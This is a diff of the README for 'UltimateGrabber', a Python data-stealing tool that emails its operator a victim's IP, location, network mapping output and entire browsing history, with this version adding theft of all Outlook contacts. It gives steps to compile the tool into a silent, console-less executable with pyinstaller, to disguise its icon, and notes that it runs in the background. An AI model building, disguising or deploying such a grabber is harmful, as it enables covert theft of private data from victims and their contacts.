@@ -1,4 +1,4 @@
-# UltimateGrabber V1.2
+# UltimateGrabber V1.3
 IP grabber programmed in python, designed to email details to a Gmail account. To set it up for your own account and get it working, you will need to take a few steps.
 
 ### DISCLAIMER
@@ -24,7 +24,8 @@ UltimateGrabber will send an Email to the preset adress within the code, contain
 - Rough lat/long
 - Output of windows `arp -a` command to map network.
 - Output of `ipconfig` windows command, to also map network.
-- **Finally, the script attaches a copy of the user's entire internet browsing history to the email as a .csv file.**
+- Attaches a copy of the user's entire internet browsing history to the email as a .csv file.
+- Attaches a .txt file containing all of the user's microsoft outlook contacts with their full name, email adress, phone number, job and departement.
 
 # Setup
 To get the script to work, you will have to insert a few details into the script so that it actually sends the email to you - otherwise it would just return an error message.
@@ -64,7 +65,7 @@ Open command prompt once more. Now, type `cd`, spacebar, then Control+V to paste
 
 Now, type in `pyinstaller --onefile --noconsole UltimateGrabber.py` and hit enter. Pyinstaller will take about 20 seconds to compile the code. Afterwards, go check the folder which you had saved the python file again. You will see two new folders, titled `build` and `dist`. Inside `dist`, you will find an EXE file - success! you have successfully turned it into a portable executable. You can change the cover icon of the EXE using a tool such as [Resource Hacker](http://www.angusj.com/resourcehacker/#download) if you please.
 
-If you run it, you will find a new email in you inbox - it will look something like this
+If you run it, you will find a new email in you inbox - it will look something like this. It will take about 50 seconds to do its job, but does so in the background.
 
 ![image](https://user-images.githubusercontent.com/83145315/186892566-12796516-93ee-4ab4-b29f-67000703fd1c.png)
 
